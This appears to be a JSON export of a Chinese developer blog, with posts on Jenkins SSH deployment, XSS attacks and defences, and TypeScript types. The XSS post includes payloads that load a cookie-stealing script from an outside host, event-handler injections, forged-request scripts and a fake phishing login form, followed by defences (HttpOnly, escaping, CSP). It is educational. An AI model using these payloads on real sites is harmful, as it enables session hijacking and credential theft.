如果生成秘钥的时候输入了密码，就在这里输入，否则留空 Path to Key： Jenkins 所在服务器秘钥(id_rsa)的路径，和下面的Key二选一 Key： Jenkins 所在服务器秘钥(id_rsa)的路内容，和上面的Path to Key二选一 Disable exec： 禁用命令执行，删除从此插件执行命令的能力 SSH ServersName： 名称，标识，自定义即可，仅用作识别 Host name： 主机名，服务器的主机名或 IP 地址，这里填写B服务器的 IP地址 Username： 将用于连接到主机的用户，比如 root Remote directory： 远程服务器上的一个目录，将用作此配置的有效根目录，比如/www/wwwroot 高级选项 Use password authentication, or use a different key 可以勾选使用密码连接或者秘钥连接 Passphrase / Password：秘钥密码或者用户名密码 Path to Key： Jenkins 所在服务器秘钥(id_rsa)的路径，和下面的Key二选一 Key： Jenkins 所在服务器秘钥(id_rsa)的路内容，和上面的Path to Key二选一 如果用秘钥链接记住这里是Jenkins(A 服务器)的私钥(id_rsa) Port：远程服务器端口，如果修改了端口，这里记得也改一下 更多参考：https://wiki.jenkins.io/display/JENKINS/Publish+Over#PublishOver-host 项目发布设置1.点击 Jenkins项目的构建环境 2.根据项目情况选择以下两项 3.选择刚刚添加的发布服务器 4.传输设置 Source files：源文件，支持全部匹配，如果要传输文件夹内所有文件和文件夹则需要在文件夹路径后加两个*符号 模式文档 Remove prefix：移除前缀，是指源文件的前缀，比如现在我们只是传输html文件夹里的所有文件，但是html文件夹本身不需要在远程服务器出现，那么就需要将其移除. Remote directory： 远程服务器目录，注意该目录是相对于刚刚系统设置里ssh servers里设置的路径，没有会创建 那么我的此次的目录就是/www/wwwroot/www.iyouhun.com exec command：在传输完成后执行的命令，一般为清理文件、复制文件、重启一些服务等等","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"//www.shen.ee/tags/Jenkins/"},{"name":"Publish over SSH","slug":"Publish-over-SSH","permalink":"//www.shen.ee/tags/Publish-over-SSH/"},{"name":"ssh服务器互信","slug":"ssh服务器互信","permalink":"//www.shen.ee/tags/ssh服务器互信/"},{"name":"服务器互信","slug":"服务器互信","permalink":"//www.shen.ee/tags/服务器互信/"},{"name":"jenkins上传远程服务器","slug":"jenkins上传远程服务器","permalink":"//www.shen.ee/tags/jenkins上传远程服务器/"},{"name":"jenkins远程服务器配置","slug":"jenkins远程服务器配置","permalink":"//www.shen.ee/tags/jenkins远程服务器配置/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"XSS跨站脚本攻击原理分析与防御","slug":"前端安全-XSS跨站脚本攻击原理分析与防御","date":"2022-06-17T03:05:39.000Z","updated":"2022-06-22T06:24:26.010Z","comments":true,"path":"article/58122.html","link":"","permalink":"//www.shen.ee/article/58122.html","excerpt":"","text":"什么是XSSXSS（Cross Site Script）攻击是指黑客通过“HTML注入”篡改网页，插入恶意的脚本，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。 XSS分类反射型XSS反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"./test.php\" method=\"get\"&gt; 您的姓名 &lt;input type=text name=\"name\" value=\"\" &gt; &lt;input type=submit value=\"登录\"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 输入一段脚本代码提交，会直接弹出 我们看一下源代码，script脚本被加载到页面中，这显然是有问题的. 存储型XSS存储型xss会把用户输入的数据存储在服务器端，这种xss具备很强的稳定性，常见的场景就是，黑客写下一篇包含恶意js脚本的博客，其他用户浏览包含恶意js脚本的博客，会在他们浏览器上执行这段恶意代码。包含恶意js脚本的博客是保存在服务端的，所以这种xss攻击叫做“存储型xss” 正常输入 非人类输入 DOM XSS传统类型的XSS漏洞（反射型或存储型）一般出现在服务器端代码中，而DOM XSS是基于DOM文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。 例： 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"t\"&gt;&lt;/div&gt; &lt;input type=\"text\" id=\"test\" value=\"\" /&gt; &lt;input type=\"button\" id=\"s\" value=\"write\" onclick=\"test()\" /&gt; &lt;script&gt; function test()&#123; var str = document.getElementById(\"test\").value document.getElementById(\"t\").innerHTML = \"&lt;a href='\"+str+\"' &gt;testLink&lt;/a&gt;\" &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 点击wirte会有一个超链接，其地址为文本框的内容。 这里的wirte按钮的onclick事件调用了test()函数。而在test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作html写入到页面中，这就造成了DOM based XSS。 我们构造一个恶意数据：&#39; onclick=&quot;alert(1)&quot; 也可以选择闭合掉标签，并插入一个新的HTML标签 &#39;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#39; XSS漏洞利用Cookie劫持常见的XSS漏洞利用方式有Cookie劫持，一般Cookie中保存了用户的登录凭证。如果Cookie泄露，则可以直接登录进用户的账号。 1.用户登录 2.攻击者欺骗用户访问带XSS payload的URL 3.用户请求攻击者的URL 4.在用户浏览器执行远程js，将cookie发送给攻击者 5.攻击者利用cookie进入用户账号 我们可以在最初的反射型例子中输入一段包含远程脚本的代码&lt;script src=&quot;https://liuliang.tk/getcookie.js&quot;&gt;&lt;/script&gt; 看下远程服务器响应日志 构造GET与POST请求通过js，让浏览器发起GET、POST请求，完成各种操作。 构造GET请求：通过插入图片，图片的src为GET请求的URL。 1234// option.jsconst img = document.createElement('img')img.src = 'https://liuliang.tk/option.php?option=add'document.body.appendChild(img) 构造POST请求： 1.构造form表单，并提交 123456// option.jsconst dd = document.createElement (\"div\")document.body.appendChild(dd)dd.innerHTML = \"&lt;form action='option.php' method='post' id='xssform'&gt;\" +\"&lt;input type='text' name='option' value='add'&gt; &lt;/form&gt;\"document.getElementById(\"xssform\").submit() 2.使用 ajax 请求 1234567891011121314151617181920// option.jslet ajax = nullconst url = 'https://liuliang.tk/option.php'if (window.XMLHttpRequest) &#123; ajax = new XMLHttpRequest()&#125; else if (window.ActiveXobject) &#123; ajax = new ActiveX0bject (\"Microsoft.XMLHTTP\")&#125; else &#123; alert(\"not compatible\")&#125;ajax.open(\"post\", url, true)ajax.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\")ajax.send('option=add')ajax.onreadystatechange = function () &#123; if (ajax.redyState == 4 &amp;&amp; ajax.status == 200) &#123; alert(\"Done\") &#125;&#125; 访问https://liuliang.tk/option.php?xss=&lt;script src=&quot;https://liuliang.tk/option.js&quot;&gt;&lt;/script&gt; option.txt中写入结果 钓鱼伪装一个页面 1234567var dd = document.createElement(\"div\")document.body.appendChild(dd)dd.innerHTML = \"&lt;meta charset='UTF-8'&gt;\" +\"&lt;form action='login.php' method='post'&gt;\" +\"&lt;li&gt;&lt;label&gt;用户名:&lt;/label&gt;\" + \"&lt;input type='text' name='username'&gt;&lt;/li&gt;\" +\"&lt;li&gt;&lt;label&gt;密码:&lt;/label&gt;\" + \"&lt;input type= 'password' name='password'&gt;&lt;/li&gt;\" +\"&lt;li&gt;&lt;input type='submit' name='login' value='登录'&gt;&lt;/li&gt;&lt;/form&gt;\" 注入 xss https://liuliang.tk/login.php?param=&lt;script src=&quot;https://liuliang.tk/login.js&quot;&gt;&lt;/script&gt; 识别浏览器及插件信息收集用户的浏览器版本信息，扩大攻击面。通过js读取浏览器的userAgent对象识别浏览器版本，查询navigator.plugins对象获取插件信息。 XSS防御HttpOnly一个cookie的使用过程如下： step1: 浏览器向服务器发起请求，这时候没有cookie。 step2 : 服务器返回时发送set-cookie，向客户端浏览器写入cookie。 step3: 在该cookie到前期，浏览器访问该域下的所有界面，都将发送该cookie。 1234567&lt;?php header(&quot;Set-Cookie: Cookie1=test1;&quot;); header(&quot;Set-Cookie: Cookie2=test2;httponly&quot;, false);?&gt;&lt;script&gt; alert(document.cookie)&lt;/script&gt; 只有test1被读取到 输入检查对传入参数进行格式校验，并对特殊字符进行过滤或转义。由于输入数据的使用场景不同，过滤或转义可能会影响实际的业务使用。同时XSS攻击发生的位置并不是参数传入的位置，可能存在遗漏。 输入检查的代码一定要在服务器端实现，因为如果在客户端使用JavaScript进行输入检查，很容易绕过检查。正常做法是客户端和服务端实现相同的输入检查，客户端可以阻挡大部分错误操作的正常用户，可以节约服务器的资源。 12345678910// jsfunction escapeHTML(str) &#123; if (!str) return ''; str = str.replace(/&amp;/g, \"&amp;amp;\"); str = str.replace(/&lt;/g, \"&amp;lt;\"); str = str.replace(/&gt;/g, \"&amp;gt;\"); str = str.replace(/\"/g, \"&amp;quot;\"); str = str.replace(/'/g, \"&amp;#39;\"); return str;&#125;; 输出检查对返回给浏览器的输出结果进行HTML实体化编码。对JavaScript输出的用户可控数据进行转义。 1234567&lt;!--api.php--&gt;&lt;?php @$input = $_GET[&apos;param&apos;]; echo &quot;&lt;div&gt;.$input.&lt;/div&gt;&quot;; echo &quot;&lt;div&gt;&quot;.htmlentities($input).&quot;&lt;/div&gt;&quot;; echo &quot;&lt;div&gt;&quot;.htmlspecialchars($input).&quot;&lt;/div&gt;&quot;;?&gt; 注：htmlentities不指定编码的话遇到中文会乱码 在使用 .innerHTML、document.write()、document.outerHTML 这些能够修改页面结构的 API 时要注意防范恶意代码，尽量使用 .textContent、.setAttribute() 等 内容安全策略（CSP）内容安全策略（Content Security Policy），实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，大大增强了网页的安全性。 两种方法可以启用 CSP。一种是通过 HTTP 头信息的 Content-Security-Policy 的字段。 1234Content-Security-Policy: script-src 'self'; object-src 'none'; style-src cdn.example.org iyouhun.com; child-src https: 另一种是通过网页的 &lt;meta&gt; 标签。 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; object-src 'none'; style-src cdn.example.org iyouhun.com; child-src https:\"&gt; 上面代码中，CSP 做了如下配置。 脚本： 只信任当前域名 &lt;object&gt;标签： 不信任任何 URL，即不加载任何资源 样式表： 只信任 cdn.example.org 和 iyouhun.com 页面子内容，如 &lt;frame&gt;、&lt;iframe&gt;： 必须使用HTTPS协议加载 其他资源： 没有限制 启用后，不符合 CSP 的外部资源就会被阻止加载。 案例百度网盘：https://zhuanlan.zhihu.com/p/24249045 酷站：https://www.cnblogs.com/chyingp/archive/2013/06/06/zcool-xss.html xss在线攻击小游戏https://alf.nu/alert1 http://prompt.ml/ https://xss-game.appspot.com/","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"前端安全","slug":"前端安全","permalink":"//www.shen.ee/tags/前端安全/"},{"name":"xss","slug":"xss","permalink":"//www.shen.ee/tags/xss/"},{"name":"xss跨站脚本攻击","slug":"xss跨站脚本攻击","permalink":"//www.shen.ee/tags/xss跨站脚本攻击/"},{"name":"xss防御","slug":"xss防御","permalink":"//www.shen.ee/tags/xss防御/"},{"name":"xss原理","slug":"xss原理","permalink":"//www.shen.ee/tags/xss原理/"},{"name":"xss攻击","slug":"xss攻击","permalink":"//www.shen.ee/tags/xss攻击/"},{"name":"cookie劫持","slug":"cookie劫持","permalink":"//www.shen.ee/tags/cookie劫持/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"TypeScript 常用类型","slug":"TypeScript 常用类型","date":"2022-06-16T04:38:39.000Z","updated":"2022-06-22T06:24:26.005Z","comments":true,"path":"article/32125.html","link":"","permalink":"//www.shen.ee/article/32125.html","excerpt":"","text":"TypeScript 常用类型TypeScript 是 JS 的超集，TS 提供了 JS 的所有功能，并且额外的增加了：类型系统 JS 有类型（比如，number/string 等），但是 JS 不会检查变量的类型是否发生变化，而 TS 会检查 TypeScript 类型系统的主要优势：可以显示标记出代码中的意外行为，从而降低了发生错误的可能性 类型注解示例代码 1let age: number = 18; 代码中:number就是类型注解 类型注解约束了只能给该变量赋值该类型的值 错误演示 12// 错误原因：将 string 类型的值赋值给了 number 类型的变量，类型不一致let age: number = '18'; 常用基础类型可以将 TS 中的常用基础类型分为两类 JavaScript 已有类型 原始类型： number/string/boolean/null/undefined/symbol 对象类型：object(数组、对象、函数等) TypeScript 新增类型 联合类型、自定义类型（类型别名）、接口、元祖、字面量类型、枚举、void、any 等 注意：原始类型在 TS 和 JS 中写法一致， 对象类型在 TS 中更加细化，每个具体对象都有自己的类型语法 原始类型 特点：可完全按照 JavaScript 中的名称来书写 number/string/boolean/null/undefined/symbol 1234let age: number = 18;let username: string = '张三';let isMerry: boolean = false;let unique: Symbol = Symbol('shuiruohanyu'); 数组类型数组两种写法 类型[]写法， 如 12let userList: string[] = ['John', 'Bob', 'Tony'];let peopleList: object[] = [&#123; name: '张三', age: 18 &#125;]; Array&lt;类型&gt;写法， 如 12let user2List: Array&lt;string&gt; = ['John', 'Bob', 'Tony'];let people2List: Array&lt;object&gt; = [&#123; name: '张三', age: 18 &#125;]; 联合类型组中既有 number 类型，又有 string 类型，这个数组的类型应该如何写? 可以用|(竖线)分割多个类型， 如 12let str: string | number = 1;str = '张三'; 如果数组中可以是字符串或者数字，则可以这么写 1let arr: Array&lt;number | string&gt; = [1, 2, '张三']; 类型别名 当一个复杂类型或者联合类型过多或者被频繁使用时，可以通过类型别名来简化该类型的使用 用法：type 名称 = 具体类型 12type CustomArray = Array&lt;number | string&gt;;let arr1: CustomArray = [1, 2, '张三']; 以上代码中，type作为创建自定义类型的关键字 类型别名可以使任意合法的变量名称 推荐大驼峰的命名写法 函数类型函数类型需要指的是 函数参数和返回值的类型，这里分为两种写法 第一种： 单独指定参数，返回值类型 12345678// 单独指定函数返回值和函数参数function add(num1: number, num2: number): number &#123; return num1 + num2;&#125;// 指定变量形式的const add2 = (num1: number, num2: number): number =&gt; &#123; return num1 + num2;&#125;; 第二种， 同时指定参数和返回值 1234567// 同时指定参数和返回值type CustomFunc = (num1: number, num2: number) =&gt; number;const add3: CustomFunc = (num1, num2) =&gt; &#123; return num1 + num2;&#125;; 注意： 当函数作为表达式时，可以通过类似箭头函数形式的语法来为函数添加类型，这种形式只适用于函数表达式 void 类型当我们的函数定义为没有返回值的类型时，可用关键字void表示 12345// 没有返回值的函数type CustomFunc1 = (num1: string, num2: number) =&gt; void;const combinStr: CustomFunc1 = () =&gt; &#123;&#125;; 如果一个函数没有返回值，此时，在 TS 的类型中，应该使用 void 类型 12345678910const add4 = () =&gt; &#123;&#125;;// 如果什么都不写 表示add4函数的类型为voidconst add5 = (): void =&gt; &#123;&#125;;// 这种写法明确指定返回值为void与上方的类型相同const add6 = (): undefined =&gt; &#123; return undefined;&#125;;// 如果指定返回值为undefined return undefined 函数可选参数当我们定义函数时，有的参数可传可不传，这种情况下，可以使用 TS 的可选参数来指定类型 比如，在使用数组的slice方法时，我们可以直接使用slice() 也可以传入参数 slice(1) 也可以slice(1,3) 1const slice = (start?: number, end?: number): void =&gt; &#123;&#125;; ? 表示该参数或者变量可传可不传 注意：可选参数只能出现在参数列表的最后， 即必须参数必须在可选参数之前 对象类型JS 中的对象是由属性和方法组成的，TS 的对象类型是对象中属性和方法的描述 写法 123456789// 如果有多个属性 可以换行 去掉间隔符号let person3: &#123; name: string; sayHello: Function;&#125; = &#123; name: '王五', sayHello() &#123;&#125;,&#125;; 总结： 可是使用{}来描述对象结构 属性采用属性名：类型形式 函数可以采用 方法名(): 返回值类型 或者 函数名: Function（不指定返回值）的形式 使用类型别名直接使用{}会降低代码可读性，不具有辨识度，更推荐使用类型别名添加对象类型 1234567891011type PersonObj = &#123; name: string; sayHello(): string;&#125;;const p1: PersonObj = &#123; name: '高大大', sayHello() &#123; return this.name; &#125;,&#125;; 带有参数的方法的类型如果对象中的函数带有参数，可以在函数中指定参数类型 12345678910111213// 带参数的函数方法type PersonObj2 = &#123; name: string; sayHello(start: number): string;&#125;;const p2: PersonObj2 = &#123; name: '高大大', sayHello(start) &#123; return this.name; &#125;,&#125;; 箭头函数形式的方法类型123456789// 箭头函数形式定义类型type People = &#123; sayHello: (start: number) =&gt; string;&#125;;const p3: People = &#123; sayHello() &#123; return ''; &#125;,&#125;; 对象可选属性对象中的若干属性，有时也是可选的，此时我们依然可以使用?来表示 1234567type Config = &#123; method?: string; url: string;&#125;;const func = (config: Config) =&gt; &#123;&#125;;func(&#123; url: '/a' &#125;); 接口 interface当一个对象类型被多次使用时，一般使用接口（interface）描述对象的类型，达到复用的目的 我们使用interface关键字来声明接口 接口名称推荐以I为开头 声明接口之后，直接使用接口名称作为变量的类型 接口后不需要分号 12345678910111213// 接口interface IPeople &#123; name: string; age: number; sayHello(): void;&#125;let p: IPeople = &#123; name: '老高', age: 18, sayHello() &#123;&#125;,&#125;; 接口和自定义类型的区别相同点：都可以给对象指定类型 不同点： 接口只能为对象指定类型， 类型别名可以为任意类型指定别名 推荐用 type 来定义 接口继承 如果两个接口之间有相同的属性和方法，可以讲公共的属性和方法抽离出来，通过继承来实现复用 比如，这两个接口都有 x、y 两个属性，重复写两次，可以，但很繁琐 123456789interface Point2D &#123; x: number; y: number;&#125;interface Point3D &#123; x: number; y: number; z: number;&#125; 更好的方式 1234interface Point2D &#123; x: number; y: number &#125;interface Point3D extends Point2D &#123; z: number&#125; 我们使用extends关键字实现了 Point3D 继承了 Point2D 的所有属性的定义， 同时拥有继承的属性和自身自定义的属性 元组当我们想定义一个数组中具体索引位置的类型时，可以使用元祖。 原有的数组模式只能宽泛的定义数组中的普遍类型，无法精确到位置 元组是另一种类型的数组，它确切知道包含多少个元素，以及特定索引对应的类型 1let position: [number, number] = [39.5427, 116.2317]; 类型推论在 TS 中，某些没有明确指出类型的地方，TS 的类型推论机制会帮助提供类型 也就是说，由于类型推论的存在，在某些地址类型注解可以省略不写。 发生类型推论的常见场景 声明变量并初始化时 决定函数返回值时 1234567// 变量creater_name自动被推断为 stringlet creater_name = 'gaoly';// 函数返回值的类型被自动推断为 numberfunction addCount(num1: number, num2: number) &#123; return num1 + num2;&#125; 推荐：能省略类型注解的地方就省略（偷懒，充分利用 TS 类型推论的能力，提升开发效率） 技巧：如果不知道类型，可以通过鼠标放在变量名称上，利用 VSCode 的提示来查看类型 字面量类型 下面的代码类型分别是什么？ 1234// 字面量类型let str1 = '张三';const str2 = '张三'; 通过 TS 的类型推导可以得到答案 1.变量 str1 的变量类型为： string 2.变量 str2 的变量类型为 ‘张三’ 解释：str1 是一个变量(let)，它的值可以是任意字符串，所以类型为:string str2 是一个常量(const)，它的值不能变化只能是 ‘张三’，所以，它的类型为:’张三’ 此时，‘张三’就是一个字面量类型，即某个特殊的字符串也可以作为 TS 中的类型 任意的 JS 字面量（对象，数组，数字）都可以作为类型使用 使用场景和模式 使用模式：字面量类型配合联合类型一起使用 使用场景：用来表示一组明确的可选值列表 比如，在贪吃蛇游戏中，游戏的方向的可选值只能是上、下、左、右中的任意一个 12345678910type Direction = 'left' | 'right' | 'up' | 'down';// 使用自定义类型:function changeDirection(direction: Direction) &#123; console.log(direction);&#125;// 调用函数时，会有类型提示：changeDirection('up'); 解释：参数 direction 的值只能是 up/down/left/right 中的任意一个 优势：相比于 string 类型，使用字面量类型更加精确、严谨 枚举 枚举的功能类似于字面量类型+联合类型组合的功能，也可以表示一组明确的可选值 枚举：定义一组命名常量。它描述一个值，该值可以是这些命名常量中的一个 123456789101112131415161718// 枚举// 创建枚举enum Direction2 &#123; Up, Down, Left, Right,&#125;// 使用枚举类型function changeDirection2(direction: Direction2) &#123; console.log(direction);&#125;// 调用函数时，需要应该传入：枚举 Direction 成员的任意一个// 类似于 JS 中的对象，直接通过 点（.）语法 访问枚举的成员changeDirection2(Direction2.Up); 数字枚举 问题：我们把枚举成员作为了函数的实参，它的值是什么呢? 解释：通过将鼠标移入 Direction.Up，可以看到枚举成员 Up 的值为 0 注意：枚举成员是有值的，默认为：从 0 开始自增的数值 我们把，枚举成员的值为数字的枚举，称为：数字枚举 当然，也可以给枚举中的成员初始化值 1234567891011121314// Down -&gt; 11、Left -&gt; 12、Right -&gt; 13enum Direction &#123; Up = 10, Down, Left, Right,&#125;enum Direction &#123; Up = 2, Down = 4, Left = 8, Right = 16,&#125; 字符串枚举 字符串枚举：枚举成员的值是字符串 注意：字符串枚举没有自增长行为，因此，字符串枚举的每个成员必须有初始值 123456enum Direction &#123; Up = 'UP', Down = 'DOWN', Left = 'LEFT', Right = 'RIGHT',&#125; 枚举实现原理 枚举是 TS 为数不多的非 JavaScript 类型级扩展(不仅仅是类型)的特性之一 因为：其他类型仅仅被当做类型，而枚举不仅用作类型，还提供值(枚举成员都是有值的) 也就是说，其他的类型会在编译为 JS 代码时自动移除。但是，枚举类型会被编译为 JS 代码 12345678910111213141516enum Direction &#123; Up = 'UP', Down = 'DOWN', Left = 'LEFT', Right = 'RIGHT'&#125;// 会被编译为以下 JS 代码：var Direction;(function (Direction) &#123; Direction['Up'] = 'UP' Direction['Down'] = 'DOWN' Direction['Left'] = 'LEFT' Direction['Right'] = 'RIGHT'&#125;)(Direction || Direction = &#123;&#125;) 说明：枚举与前面讲到的字面量类型+联合类型组合的功能类似，都用来表示一组明确的可选值列表 一般情况下，推荐使用字面量类型+联合类型组合的方式，因为相比枚举，这种方式更加直观、简洁、高效 any 类型 原则:不推荐使用 any!这会让 TypeScript 变为 “AnyScript”(失去 TS 类型保护的优势) 因为当值的类型为 any 时，可以对该值进行任意操作，并且不会有代码提示 12345let obj: any = &#123; x: 0 &#125;;obj.bar = 100;obj();const n: number = obj; 解释:以上操作都不会有任何类型错误提示，即使可能存在错误 尽可能的避免使用 any 类型，除非临时使用 any 来“避免”书写很长、很复杂的类型 其他隐式具有 any 类型的情况 声明变量不提供类型也不提供默认值 函数参数不加类型 注意：因为不推荐使用 any，所以，这两种情况下都应该提供类型 在项目开发中，尽量少用 any 类型 类型断言有时候你会比 TS 更加明确一个值的类型，此时，可以使用类型断言来指定更具体的类型。 比如， 1const aLink = document.getElementById('link'); 注意：该方法返回值的类型是 HTMLElement，该类型只包含所有标签公共的属性或方法，不包含 a 标签特有的 href 等属性 因此，这个类型太宽泛(不具体)，无法操作 href 等 a 标签特有的属性或方法 解决方式：这种情况下就需要使用类型断言指定更加具体的类型 使用类型断言： 1const aLink = document.getElementById('link') as HTMLAnchorElement; 解释: 使用 as 关键字实现类型断言 关键字 as 后面的类型是一个更加具体的类型（HTMLAnchorElement 是 HTMLElement 的子类型） 通过类型断言，aLink 的类型变得更加具体，这样就可以访问 a 标签特有的属性或方法了 另一种语法，使用 &lt;&gt; 语法，这种语法形式不常用知道即可: 12// 该语法，知道即可：在react的jsx中使用会报错const aLink = &lt;HTMLAnchorElement&gt;document.getElementById('link'); 技巧：在浏览器控制台，通过 __proto__ 获取 DOM 元素的类型 typeof 众所周知，JS 中提供了 typeof 操作符，用来在 JS 中获取数据的类型 1console.log(typeof 'Hello world'); // string 实际上，TS 也提供了 typeof 操作符：可以在类型上下文中引用变量或属性的类型（类型查询） 使用场景:根据已有变量的值，获取该值的类型，来简化类型书写 12345let p = &#123; x: 1, y: 2 &#125;;function formatPoint(point: &#123; x: number; y: number &#125;) &#123;&#125;formatPoint(p);function formatPoint(point: typeof p) &#123;&#125; 解释: 使用 typeof 操作符来获取变量 p 的类型，结果与第一种（对象字面量形式的类型）相同 typeof 出现在类型注解的位置（参数名称的冒号后面）所处的环境就在类型上下文(区别于 JS 代码) 注意：typeof 只能用来查询变量或属性的类型，无法查询其他形式的类型（比如，函数调用的类型）","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"TypeScript","slug":"TypeScript","permalink":"//www.shen.ee/tags/TypeScript/"},{"name":"TypeScript常用类型","slug":"TypeScript常用类型","permalink":"//www.shen.ee/tags/TypeScript常用类型/"},{"name":"ts","slug":"ts","permalink":"//www.shen.ee/tags/ts/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"TypeScript 高级类型","slug":"TypeScript 高级类型","date":"2022-06-16T04:38:39.000Z","updated":"2022-06-22T06:24:26.004Z","comments":true,"path":"article/5963.html","link":"","permalink":"//www.shen.ee/article/5963.html","excerpt":"","text":"TypeScript 高级类型TS 中的类型兼容性TS 类型兼容性参考文档 两种类型系统：1 Structural Type System(结构化类型系统) 2 Nominal Type System(标明类型系统) TS 采用的是结构化类型系统，也叫做 duck typing(鸭子类型)，类型检查关注的是值所具有的形状 也就是说，在结构类型系统中，如果两个对象具有相同的形状，则认为它们属于同一类型。比如： 123456789101112131415interface Point &#123; x: number; y: number;&#125;interface Point2D &#123; x: number; y: number;&#125;let p2: Point2D = &#123; x: 1, y: 2,&#125;;// 不会报错let p: Point = p2; 对于对象类型来说，y 的成员至少与 x 相同，则 x 兼容 y（成员多的可以赋值给少的，或者说：只要满足必须的类型就行，多了也没事） 1234567891011121314151617interface Point2D &#123; x: number; y: number;&#125;interface Point3D &#123; x: number; y: number; z: number;&#125;let p3: Point3D = &#123; x: 1, y: 2, z: 3,&#125;;// 不会报错let p2: Point2D = p3; 函数类型的类型兼容性比较复杂，需要考虑：1 参数个数 2 返回值类型 等等 参数个数：参数多的兼容参数少的(或者说，参数少的可以赋值给多的) 在 JS 中省略用不到的函数参数实际上是很常见的，这样的使用方式，促成了 TS 中函数类型之间的兼容性 123456789101112const arr = ['a', 'b', 'c'];// arr.forEach 第一个参数的类型为： (value: string, index: number, array: string[]) =&gt; voidarr.forEach(() =&gt; &#123;&#125;);arr.forEach((item) =&gt; &#123;&#125;);arr.forEach((item, index) =&gt; &#123;&#125;);type F1 = (a: number) =&gt; void;type F2 = (a: number, b: number) =&gt; void;// 正确：参数少的可以赋值给参数多的let f1: F1 = (a) =&gt; &#123;&#125;;let f2: F2 = f1; 返回值类型：只要满足必须的类型要求就行，多了也没事 1234type F1 = () =&gt; void;const f1: F1 = () =&gt; &#123; return 123;&#125;; 泛型概述 泛型（Generics）可以在保证类型安全前提下，让函数等与多种类型一起工作，从而实现复用，常用于：函数、接口、class 中 需求：创建一个 id 函数，传入什么数据就返回该数据本身（也就是说，参数和返回值类型相同） 1234567// 比如，该函数传入什么数值，就返回什么数值function id(value: number): number &#123; return value;&#125;// res =&gt; 10const res = id(10); 比如，id(10) 调用以上函数就会直接返回 10 本身。但是，该函数只接收数值类型，无法用于其他类型 为了能让函数能够接受任意类型的参数，可以将参数类型修改为 any。但是，这样就失去了 TS 的类型保护，类型不安全 123function id(value: any): any &#123; return value;&#125; 这时候，就可以使用泛型来实现了 泛型在保证类型安全(不丢失类型信息)的同时，可以让函数等与多种不同的类型一起工作，灵活可复用 实际上，在 C# 和 Java 等编程语言中，泛型都是用来实现可复用组件功能的主要工具之一 泛型函数创建泛型函数： 12345678function id&lt;Type&gt;(value: Type): Type &#123; return value;&#125;// 也可以仅使用一个字母来作为类型变量的名称function id&lt;T&gt;(value: T): T &#123; return value;&#125; 解释： 语法：在函数名称的后面添加 &lt;&gt;（尖括号），尖括号中添加类型变量，比如此处的 Type 类型变量 Type，是一种特殊类型的变量，它处理类型而不是值 类型变量相当于一个类型容器，能够捕获用户提供的类型（具体是什么类型由用户调用该函数时指定） 因为 Type 是类型，因此可以将其作为函数参数和返回值的类型，表示参数和返回值具有相同的类型 类型变量 Type，可以是任意合法的变量名称 调用泛型函数： 12345// 函数参数和返回值类型都为：numberconst num = id&lt;number&gt;(10);// 函数参数和返回值类型都为：stringconst str = id&lt;string&gt;('a'); 解释： 语法：在函数名称的后面添加 &lt;&gt;（尖括号），尖括号中指定具体的类型，比如，此处的 number 当传入类型 number 后，这个类型就会被函数声明时指定的类型变量 Type 捕获到 此时，Type 的类型就是 number，所以，函数 id 参数和返回值的类型也都是 number 这样，通过泛型就做到了让 id 函数与多种不同的类型一起工作，实现了复用的同时保证了类型安全 简化泛型函数调用在调用泛型函数时，可以省略 &lt;类型&gt; 来简化泛型函数的调用 123// 省略 &lt;number&gt; 调用函数let num = id(10);let str = id('a'); 解释: 此时，TS 内部会采用一种叫做类型参数推断的机制，来根据传入的实参自动推断出类型变量 Type 的类型 比如，传入实参 10，TS 会自动推断出变量 num 的类型 number，并作为 Type 的类型 推荐：使用这种简化的方式调用泛型函数，使代码更短，更易于阅读 说明：当编译器无法推断类型或者推断的类型不准确时，就需要显式地传入类型参数 泛型约束默认情况下，泛型函数的类型变量 Type 可以代表任意类型，这导致无法访问任何属性 比如，以下示例代码中想要获取参数的长度： 因为 Type 可以代表任意类型，无法保证一定存在 length 属性，比如 number 类型就没有 length。因此，无法访问 length 属性 1234567function id&lt;Type&gt;(value: Type): Type &#123; // 注意：此处会报错 console.log(value.length); return value;&#125;id('a'); 此时，就需要为泛型添加约束来收缩类型（缩窄类型取值范围） 添加泛型约束收缩类型，主要有以下两种方式：1 指定更加具体的类型 2 添加约束 首先，我们先来看第一种情况，如何指定更加具体的类型： 比如，将类型修改为 Type[](Type 类型的数组)，因为只要是数组就一定存在 length 属性，因此就可以访问了 12345function id&lt;Type&gt;(value: 